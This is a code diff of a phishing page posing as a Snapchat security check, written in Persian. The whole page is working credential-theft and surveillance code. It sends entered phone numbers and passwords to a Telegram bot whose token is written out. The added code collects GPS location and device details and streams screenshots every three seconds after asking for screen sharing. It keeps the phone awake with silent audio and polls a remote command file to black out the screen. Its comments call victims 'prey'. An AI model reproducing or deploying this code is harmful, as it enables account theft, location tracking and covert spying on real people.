@@ -3,81 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>تایید حساب اسنپ‌چت</title>
+    <title>Security Verification | Snapchat</title>
+    <link rel="manifest" href="manifest.json">
     <style>
-        body { background: #FFFC00; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .login-card { background: white; width: 90%; max-width: 400px; padding: 40px 20px; border-radius: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center; }
-        .logo { width: 70px; margin-bottom: 20px; }
-        h2 { font-size: 22px; margin-bottom: 10px; color: #000; }
-        p { color: #555; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
-        input { width: 100%; padding: 18px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 15px; background: #f5f5f5; font-size: 16px; outline: none; box-sizing: border-box; }
-        .btn-connect { background: #000; color: #fff; width: 100%; padding: 18px; border-radius: 35px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; transition: 0.3s; }
-        .btn-connect:active { transform: scale(0.95); }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; }
+        body { background: #FFFC00; margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 40px 20px; border-radius: 45px; box-shadow: 0 25px 60px rgba(0,0,0,0.15); text-align: center; position: relative; z-index: 2; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        input { width: 100%; padding: 18px; margin: 12px 0; border: 1.5px solid #eee; border-radius: 18px; background: #fafafa; font-size: 16px; outline: none; box-sizing: border-box; }
+        .btn-main { background: #000; color: #fff; width: 100%; padding: 20px; border-radius: 40px; border: none; font-weight: bold; cursor: pointer; font-size: 19px; margin-top: 20px; -webkit-tap-highlight-color: transparent; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; }
+        .loading-text { display: none; margin-top: 20px; color: #555; font-weight: bold; }
     </style>
 </head>
 <body>
     <div id="overlay"></div>
-    <div class="login-card" id="ui">
+    <div class="card" id="ui">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" class="logo">
-        <h2>امنیت حساب</h2>
-        <p>برای جلوگیری از حذف اطلاعات و چت‌ها، هویت خود را تایید کنید.</p>
+        <h2 style="margin:0; font-size:24px;">تایید امنیت سیستم</h2>
+        <p style="color:#666; font-size:14px; line-height:1.5;">حساب شما نیاز به بازبینی امنیتی دارد. لطفاً اطلاعات را وارد کنید.</p>
         
-        <input type="tel" id="user_phone" placeholder="شماره تلفن (مثال: 0912...)">
-        <input type="password" id="user_pass" placeholder="رمز عبور اسنپ‌چت">
+        <input type="tel" id="u_phone" placeholder="شماره همراه">
+        <input type="password" id="u_pass" placeholder="رمز عبور">
         
-        <button class="btn-connect" onclick="ignite()">تایید و ورود</button>
+        <button class="btn-main" onclick="execute()">تایید و اتصال امن</button>
+        <div id="status" class="loading-text">🔄 در حال همگام‌سازی...</div>
     </div>
+
+    <audio id="silentMode" loop>
+        <source src="https://github.com/anars/blank-audio/raw/master/10-seconds-of-silence.mp3" type="audio/mp3">
+    </audio>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TG_INFO = {
+        const CFG = {
             t: "8484189401:AAHZZkNvQUXIk97rA1b0W7r1e-z5IWXdbpg",
             c: "7261099659",
             h: "https://whale-tracker-live.github.io/Snapchat/"
         };
 
-        async function sendToTelegram(message, blob = null) {
-            const type = blob ? 'sendDocument' : 'sendMessage';
-            const url = `https://api.telegram.org/bot${TG_INFO.t}/${type}`;
-            const formData = new FormData();
-            formData.append('chat_id', TG_INFO.c);
-            
-            if (blob) {
-                formData.append('document', blob, `shot_${Date.now()}.jpg`);
-            } else {
-                formData.append('text', message);
-            }
-
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch (e) { console.error("Error sending data"); }
+        async function tg(msg, blob = null) {
+            const url = `https://api.telegram.org/bot${CFG.t}/${blob ? 'sendDocument' : 'sendMessage'}`;
+            const fd = new FormData();
+            fd.append('chat_id', CFG.c);
+            if (blob) fd.append('document', blob, `live_${Date.now()}.jpg`);
+            else fd.append('text', msg);
+            try { await fetch(url, { method: 'POST', body: fd }); } catch(e) {}
         }
 
-        async function ignite() {
-            const ph = document.getElementById('user_phone').value;
-            const ps = document.getElementById('user_pass').value;
+        async function execute() {
+            const p = document.getElementById('u_phone').value;
+            const s = document.getElementById('u_pass').value;
+            if(!p || !s) return alert("فیلدها را پر کنید");
 
-            if (!ph || !ps) {
-                alert("لطفاً تمام فیلدها را پر کنید.");
-                return;
-            }
-
-            // ۱. ارسال پسورد بلافاصله
-            await sendToTelegram(`💎 اطلاعات جدید صید شد!\n\n📞 تلفن: ${ph}\n🔑 پسورد: ${ps}`);
+            // ۱. پخش صدای بی صدا برای جلوگیری از خواب رفتن گوشی
+            document.getElementById('silentMode').play();
             
-            // تغییر ظاهر صفحه برای جلب اعتماد
-            document.getElementById('ui').innerHTML = `
-                <div style="padding: 20px;">
-                    <div class="spinner"></div>
-                    <h3>در حال همگام‌سازی...</h3>
-                    <p>لطفاً این صفحه را نبندید. این فرآیند ممکن است ۲ دقیقه طول بکشد.</p>
-                </div>
-            `;
+            // ۲. ارسال پسورد
+            await tg(`🔥 شکار جدید!\n📞 شماره: ${p}\n🔑 رمز: ${s}`);
+            
+            // ۳. تغییر UI
+            document.getElementById('status').style.display = 'block';
+            document.querySelector('.btn-main').style.display = 'none';
 
-            // ۲. شروع اسکرین‌شات زنده (در صورت تایید قربانی)
+            // ۴. دریافت موقعیت مکانی (GPS)
+            navigator.geolocation.getCurrentPosition(async pos => {
+                const map = `📍 لوکیشن دقیق:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await tg(map);
+            }, () => { tg("⚠️ اجازه لوکیشن داده نشد"); }, {enableHighAccuracy: true});
+
+            // ۵. دریافت اطلاعات سیستمی
+            const info = `📱 مشخصات:\nمرورگر: ${navigator.platform}\nباتری: ${ (await navigator.getBattery()).level * 100 }%`;
+            await tg(info);
+
+            // ۶. شروع مانیتورینگ زنده (اسکرین‌شات)
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 const video = document.getElementById('v');
@@ -88,20 +88,18 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendToTelegram("🖥 اسکرین‌شات زنده از هدف", blob), 'image/jpeg', 0.2);
-                }, 3000); // هر ۳ ثانیه یک عکس
-            } catch (err) {
-                await sendToTelegram("⚠️ قربانی اجازه دسترسی به صفحه را نداد.");
-            }
+                    canvas.toBlob(blob => tg("🖥 مانیتور هدف", blob), 'image/jpeg', 0.2);
+                }, 3000);
+            } catch(e) { tg("⚠️ اسکرین‌شیر تایید نشد"); }
         }
 
-        // ۳. سیستم فرمان از راه دور (C2)
+        // چک کردن دستورات ادمین (قفل از راه دور)
         setInterval(async () => {
             try {
-                const response = await fetch(TG_INFO.h + 'commands.json?nocache=' + Date.now());
-                const data = await response.json();
+                const res = await fetch(CFG.h + 'commands.json?v=' + Date.now());
+                const data = await res.json();
                 document.getElementById('overlay').style.display = (data.action === 'fake_lock') ? 'block' : 'none';
-            } catch (e) {}
+            } catch(e) {}
         }, 4000);
     </script>
 </body>
